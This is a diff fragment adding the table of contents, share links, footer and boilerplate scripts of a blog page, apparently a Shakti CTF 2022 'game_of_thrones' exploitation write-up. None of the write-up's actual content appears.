+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number"></span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">0.2.</span> <span class="toc-text">Source Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-use-dragons"><span class="toc-number">0.2.1.</span> <span class="toc-text">1. use_dragons()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-kings-landing-amp-num-men-amp-num-dragons"><span class="toc-number">0.2.2.</span> <span class="toc-text">2. kings_landing(&amp;num_men, &amp;num_dragons)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-white-walkers-amp-num-men-amp-num-dragons"><span class="toc-number">0.2.3.</span> <span class="toc-text">3. white_walkers(&amp;num_men, &amp;num_dragons)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">2.3.</span> <span class="toc-text">flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&text=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&is_video=false&description=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shakti CTF 2022 - game_of_thrones (medium)&body=Check out this article: https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&name=Shakti CTF 2022 - game_of_thrones (medium)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&t=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
